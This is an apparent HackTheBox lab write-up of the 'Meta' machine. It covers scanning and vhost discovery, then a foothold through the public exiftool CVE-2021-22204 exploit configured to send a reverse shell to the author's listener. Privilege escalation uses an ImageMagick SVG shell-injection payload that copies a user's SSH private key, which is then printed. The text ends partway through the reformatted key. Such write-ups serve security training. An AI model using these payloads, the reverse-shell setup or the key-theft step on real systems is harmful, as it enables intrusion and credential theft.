<!doctype html><html lang=en><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="ie=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=author content><meta name=description content="META (Linux) Writeup  Reconnaissance Let&amp;rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.140 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following Result &amp;hellip;
 PORT 22 : running OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) PORT 80 : running Apache httpd  Let&amp;rsquo;s do a full machine scan as well."><meta name=keywords content><meta name=robots content="noodp"><meta name=theme-color content><link rel=canonical href=https://an0nud4y.com/htb/htb-meta/><title>HackTheBox: Meta :: An0nud4y</title><link href=https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css rel=stylesheet type=text/css><link rel=stylesheet href=/main.4dd687783188f49ad84dad46a495038b4e06a83febd3af9ef767c2f582389730.css><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/safari-pinned-tab.svg color=#252627><link rel="shortcut icon" href=/favicon.ico><meta name=msapplication-TileColor content="#252627"><meta name=theme-color content="#252627"><meta itemprop=name content="HackTheBox: Meta"><meta itemprop=description content="META (Linux) Writeup  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.140 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following Result &mldr;
 PORT 22 : running OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) PORT 80 : running Apache httpd  Let&rsquo;s do a full machine scan as well."><meta itemprop=datePublished content="2022-04-16T00:00:00+00:00"><meta itemprop=dateModified content="2022-04-16T00:00:00+00:00"><meta itemprop=wordCount content="1653"><meta itemprop=keywords content><meta name=twitter:card content="summary"><meta name=twitter:title content="HackTheBox: Meta"><meta name=twitter:description content="META (Linux) Writeup  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.140 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following Result &mldr;
 PORT 22 : running OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) PORT 80 : running Apache httpd  Let&rsquo;s do a full machine scan as well."><meta property="og:title" content="HackTheBox: Meta"><meta property="og:description" content="META (Linux) Writeup  Reconnaissance Let&rsquo;s do a Quick Scan of the target using NMAP.
nmap -sV -sC -O -oA nmap/initial 10.10.11.140 -sC : run Default Nmap scripts -sV : detects service versions -O : detects OS -oA : output all formats and store in file *nmap/initial  We got the following Result &mldr;
 PORT 22 : running OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) PORT 80 : running Apache httpd  Let&rsquo;s do a full machine scan as well."><meta property="og:type" content="article"><meta property="og:url" content="https://an0nud4y.com/htb/htb-meta/"><meta property="article:published_time" content="2022-04-16T00:00:00+00:00"><meta property="article:modified_time" content="2022-04-16T00:00:00+00:00"><meta property="og:site_name" content="An0nud4y"><meta property="article:published_time" content="2022-04-16 00:00:00 +0000 UTC"></head><body class=dark-theme><div class=container><header class=header><span class=header__inner><a href=/ style=text-decoration:none><div class=logo><span class=logo__mark>></span>
<span class=logo__text>S3cur!ty_Bl0g</span>
<span class=logo__cursor></span></div></a><span class=header__right><nav class=menu><ul class=menu__inner><li><a href=https://an0nud4y.com/about>About</a></li><li><a href=https://an0nud4y.com/htb>HackTheBox</a></li><li><a href=https://an0nud4y.com/notes>Notes</a></li><li><a href=https://an0nud4y.com/resume>Resume</a></li><li><a href=https://an0nud4y.com/talks>Talks</a></li><li><a href=https://an0nud4y.com/writeups>Writeups</a></li></ul></nav><span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg></span><span class="theme-toggle unselectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41C32.4934 41 41 32.4934 41 22 41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg></span></span></span></header><div class=content><main class=post><div class=post-info></p></div><article><h2 class=post-title><a href=https://an0nud4y.com/htb/htb-meta/>HackTheBox: Meta</a></h2><div class=post-content><h1 id=meta-linux-writeup>META (Linux) Writeup</h1><p><img src=/assets/Pasted%20image%2020220223124828.png alt="assets/Pasted image 20220223124828.png"></p><hr><h1 id=reconnaissance>Reconnaissance</h1><p>Let&rsquo;s do a Quick Scan of the target using NMAP.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sV -sC -O -oA nmap/initial 10.10.11.140
</code></pre></div><ul><li><strong>-sC</strong> : run Default Nmap scripts</li><li><strong>-sV</strong> : detects service versions</li><li><strong>-O</strong> : detects OS</li><li><strong>-oA</strong> : output all formats and store in file *nmap/initial</li></ul><p>We got the following Result &mldr;</p><ul><li><strong>PORT 22</strong> : running OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</li><li><strong>PORT 80</strong> : running Apache httpd</li></ul><p><img src=/assets/Pasted%20image%2020220223131554.png alt="assets/Pasted image 20220223131554.png"></p><p>Let&rsquo;s do a full machine scan as well.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sV -sC -p- -O -oA nmap/full 10.10.11.140
</code></pre></div><p>Similarly, Let&rsquo;s do a UDP Ports scan as well.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nmap -sU -p- -O -oA nmap/udp 10.10.11.140
</code></pre></div><p>Didn&rsquo;t found any new ports from Full Scan and UDP Scan.</p><p>Let&rsquo;s Enumerate on running services.</p><hr><h1 id=enumeration>Enumeration</h1><p>Port 22 is running openssh which does not seems to be vulnerable to any attack which can lead us to Root, So its better to enumerate Port 80 http to find Some Attack vectors.</p><p>Trying to visit the port 80 manually redirects us to <code>http://artcorp.htb/</code> , So we have to add this host to our /etc/hosts file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>echo <span style=color:#e6db74>&#34;10.10.11.140 artcorp.htb&#34;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>Going through the domain , we didn&rsquo;t found anything useful other than the new product name &ldquo;Metaview&rdquo;.</p><p>I have tried to bruteforce the directory listings using Gobuster , But that didn&rsquo;t worked out and we didn&rsquo;t got anything useful.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -u http://artcorp.htb/ -t <span style=color:#ae81ff>100</span> -x php,html,jpg,txt --no-tls-validation -q

</code></pre></div><p><img src=/assets/Pasted%20image%2020220224043502.png alt="assets/Pasted image 20220224043502.png"></p><p>Let&rsquo;s try to find if there is any subdomain running under the domain, May be there is any development Subdomain we are missing out.</p><p>Let&rsquo;s Fire Gobuster to find out&mldr;</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>gobuster vhost -u artcorp.htb -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  -t 100
</code></pre></div><p>We got the following result.</p><pre><code>Found: dev01.artcorp.htb 
</code></pre><p><img src=/assets/Pasted%20image%2020220223221428.png alt="assets/Pasted image 20220223221428.png"></p><p>Let&rsquo;s add this subdomain to /etc/hosts file as well.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>echo <span style=color:#e6db74>&#34;10.10.11.140 dev01.artcorp.htb&#34;</span> &gt;&gt; /etc/hosts
</code></pre></div><p>We found out that this subdomain is running Development environment.</p><p><img src=/assets/Pasted%20image%2020220224044253.png alt="assets/Pasted image 20220224044253.png"></p><p>Let&rsquo;s Check out the Metaview Application.</p><p><img src=/assets/Pasted%20image%2020220224044434.png alt="assets/Pasted image 20220224044434.png"></p><p>In this application we have a image upload fuctionality, which uploads the image and shows us the metadata of the image as shown below,</p><p><img src=/assets/Pasted%20image%2020220224044624.png alt="assets/Pasted image 20220224044624.png"></p><p>We can try several things here,</p><ul><li>Uploading a PHP Reverse Shell (Backed is Running PHP)</li><li>Figuring out How Backend is processing the image to get the metadata from image.</li></ul><p>File uploading didn&rsquo;t worked out , i tried all possible methods to bypass the file type upload restrictions, But none of them worked for me, Also I tried bruteforcing the directory to figure out the file upload directory, But came out that the files were named randomly and we had no possible ways to find the name and trigger the php reverse shell, So this particular method did not worked out.</p><p>As the application is showing the metadata of an image, and the metadata format seems identical to that of exiftool output format, Its wasy to figure out that the backend is running the exiftool to get the image metadata.</p><p><img src=/assets/Pasted%20image%2020220224050815.png alt="assets/Pasted image 20220224050815.png"></p><p>Both output are some way similar, So we can say surely the backend is running exiftool to process the uploaded images.</p><p>I was not able to find the exiftool version that backend is using, So had no idea what to look for, But a quick available exploits scan gave us a exiftool Code Execution exploit <code>CVE-2021-22204</code> ,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>searchsploit exiftool
</code></pre></div><p><img src=/assets/Pasted%20image%2020220224051243.png alt="assets/Pasted image 20220224051243.png"></p><p>We found a Public exploit to simple the exploitation task.</p><pre><code>https://github.com/convisolabs/CVE-2021-22204-exiftool
</code></pre><p>We don&rsquo;t know yet if the backend exiftool is vulnerable or not.</p><hr><h1 id=gaining-an-initial-foothold>Gaining an Initial Foothold</h1><p>Let&rsquo;s find out if the exploit we found is applicable at the target or not.</p><p>Clone the exploit repo,</p><pre><code>git clone https://github.com/convisolabs/CVE-2021-22204-exiftool &amp;&amp; cd CVE-2021-22204-exiftool
</code></pre><p>Modify the exploit.py , to add the IP and PORT</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python>ip <span style=color:#f92672>=</span> <span style=color:#e6db74></span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>10.10.14.9</span><span style=color:#e6db74>&#39;</span>
port <span style=color:#f92672>=</span> <span style=color:#e6db74></span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>4444</span><span style=color:#e6db74>&#39;</span>
</code></pre></div><p><img src=/assets/Pasted%20image%2020220224052745.png alt="assets/Pasted image 20220224052745.png"></p><p>Run a netcat listener ,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>nc -lnvp 4444
</code></pre></div><p>Upload the image.jpg from the Exploit Directory, And wait for the reverse shell.</p><p><img src=/assets/Pasted%20image%2020220224053142.png alt="assets/Pasted image 20220224053142.png"></p><p>We got the shell as www-data user, So the exiftool was vulnerable to the CVE-2021-22204.</p><p>We are not able to access the User Flag, So we have to Upgrade the Access to the target system.</p><hr><h1 id=privilege-escalation>Privilege Escalation</h1><p>We currently do not have root access neither we have user access, Let&rsquo;s escalate the priviledge to gain User and Root access.</p><h2 id=getting-user-privilege>Getting User Privilege</h2><p>Running linpeas on the target machine didn&rsquo;t gave us anything useful other than these two uncommon bash scripts.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>/usr/local/bin/convert_images.sh
/usr/bin/gettext.sh
</code></pre></div><p><img src=/assets/Pasted%20image%2020220224085029.png alt="assets/Pasted image 20220224085029.png"></p><p>Going through the <a href=https://book.hacktricks.xyz/linux-unix/privilege-escalation#process-monitoring>Hacktricks Privilege Escalation Notes</a>, I tried to find running processes using the conventional commands,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>ps aux
ps -ef
top -n 1
</code></pre></div><p>None of these actually gave any useful results.
In the Process Monitoring Part of Hacktricks Notes , We can found that We can use a Tool <a href=https://github.com/DominicBreuker/pspy><em>Pspy</em></a> to monitor processes without higher system privileges.</p><p>Download the compiled released version and Using http and wget transfer the pspy file on target machine.</p><pre><code>https://github.com/DominicBreuker/pspy/releases
</code></pre><p>Let&rsquo;s Run the pspy to find the running processes on the target machine.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>./pspy &gt; pspy.txt &amp;
</code></pre></div><p>Note: We have a unstable shell , So we are redirecting the output of pspy in a text file and backgrounding the process, So we can still have a interactive shell.</p><p>Checking the output from pspy.txt file after a few minutes, We found few interesting Processes and Cron Jobs, Which are running <em>/usr/local/bin/convert_images.sh</em> file that we earlier found in Linpeas Enumeration.</p><pre><code>CMD: UID=1000 PID=1084   | /bin/bash /usr/local/bin/convert_images.sh 

CMD: UID=0    PID=1088   | /bin/sh -c rm /var/www/dev01.artcorp.htb/convert_images/* 

CMD: UID=0    PID=1087   | /usr/sbin/CRON -f 

CMD: UID=1000 PID=1085   | /usr/local/bin/mogrify -format png *.* 

CMD: UID=1000 PID=1091   | pkill mogrify 

CMD: UID=0    PID=2409   | /bin/sh -c rm /tmp/* 

CMD: UID=0    PID=2386   | /bin/sh -c rm /var/www/dev01.artcorp.htb/metaview/uploads/* 
</code></pre><p>Let&rsquo;s Check out the <em>/usr/local/bin/convert_images.sh</em> script,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ cat /usr/local/bin/convert_images.sh

<span style=color:#75715e>#!/bin/bash</span>
cd /var/www/dev01.artcorp.htb/convert_images/ <span style=color:#f92672>&amp;&amp;</span> /usr/local/bin/mogrify -format png *.* 2&gt;/dev/null
pkill mogrify
</code></pre></div><p>We found out that the script is running as cron job and executing in some time interval.
So script is running <em>mogrify</em>, Which is a ImageMagick tool to do the Image Modifications.</p><p>We also found out what version the mogrify is running,</p><p><img src=/assets/Pasted%20image%2020220224224130.png alt="assets/Pasted image 20220224224130.png"></p><p>Doing some research we found out a interesting blog from <a href=https://portswigger.net/daily-swig/imagemagick-pdf-parsing-flaw-allowed-attacker-to-execute-shell-commands-via-maliciously-crafted-image>portswigger</a> , From there we found the Security Researcher <em><a href=https://twitter.com/insertScript>Alex InfÃ¼hr</a></em>&lsquo;s Blog <a href=https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html>Post</a>.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>https://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html
</code></pre></div><p>From the technical blog we found a payload , which can read any file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>&lt;image authenticate<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ff&#34; `echo $(id)&gt; ./0wned`;&#34;&#39;</span>&gt;
  &lt;read filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pdf:/etc/passwd&#34;</span>/&gt;
  &lt;get width<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;base-width&#34;</span> height<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;base-height&#34;</span> /&gt;
  &lt;resize geometry<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;400x400&#34;</span> /&gt;
  &lt;write filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;test.png&#34;</span> /&gt;
  &lt;svg width<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;700&#34;</span> height<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;700&#34;</span> xmlns<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.w3.org/2000/svg&#34;</span> xmlns:xlink<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/xlink&#34;</span>&gt;       
  &lt;image xlink:href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;msl:poc.svg&#34;</span> height<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;100&#34;</span> width<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;100&#34;</span>/&gt;
  &lt;/svg&gt;
&lt;/image&gt;
</code></pre></div><p>Let&rsquo;s Use the above payload to get the User Private SSH Key.</p><p>Using the Technical Blog We Can easily create a custom payload.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>&lt;image authenticate<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;ff&#34; `echo $(whoami ; cat ~/.ssh/id_rsa)&gt; /dev/shm/id_rsa`;&#34;&#39;</span>&gt;
  &lt;read filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;pdf:/etc/passwd&#34;</span>/&gt;
  &lt;get width<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;base-width&#34;</span> height<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;base-height&#34;</span> /&gt;
  &lt;resize geometry<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;400x400&#34;</span> /&gt;
  &lt;write filename<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;test.png&#34;</span> /&gt;
  &lt;svg width<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;700&#34;</span> height<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;700&#34;</span> xmlns<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.w3.org/2000/svg&#34;</span> xmlns:xlink<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://www.w3.org/1999/xlink&#34;</span>&gt;       
  &lt;image xlink:href<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;msl:poc.svg&#34;</span> height<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;100&#34;</span> width<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;100&#34;</span>/&gt;
  &lt;/svg&gt;
&lt;/image&gt;
</code></pre></div><p>Save this in a <em>poc.svg</em> file and Move it in <em>/var/www/dev01.artcorp.htb/convert_images/</em> directory.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>cp poc.svg /var/www/dev01.artcorp.htb/convert_images/
</code></pre></div><p>Now wait for the cron job to run the script, And simultaneously check for id_rsa file in /tmp directory.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>cat /dev/shm/id_rsa
</code></pre></div><p>We got the private ssh key and the user,</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell>thomas 
-----BEGIN OPENSSH PRIVATE KEY----- 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 bhFErAeoncE3vJAAAACXJvb3RAbWV0YQE<span style=color:#f92672>=</span> -----END OPENSSH PRIVATE KEY-----
</code></pre></div><p>Let&rsquo;s use this ssh key to login as the thomas user.
This private key is a OPENSSH key, So we need to convert it to PEM/RSA key.</p><p>We can use the following <a href=https://stackoverflow.com/questions/54994641/openssh-private-key-to-rsa-private-key>guide</a> to do so.</p><p>Remove all the spaces and add new lines, Same as below format. Also add a new line at the end of the file.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>-----BEGIN OPENSSH PRIVATE KEY-----
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
